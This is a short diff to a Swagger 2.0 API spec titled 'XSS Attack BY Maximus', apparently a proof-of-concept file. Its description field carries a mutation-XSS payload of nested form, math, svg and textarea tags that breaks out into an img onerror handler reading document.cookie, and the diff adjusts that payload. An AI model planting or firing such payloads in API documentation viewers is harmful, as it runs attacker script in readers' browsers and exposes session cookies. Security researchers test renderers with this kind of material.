@@ -1,8 +1,8 @@
 swagger: '2.0'
 info:
-  title: XSS Attack BY MAximus
+  title: XSS Attack BY Maximus
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src="x" onerror=alert(document.cookie)>"></form>
   version: production
 basePath: /JSSResource/
 produces:
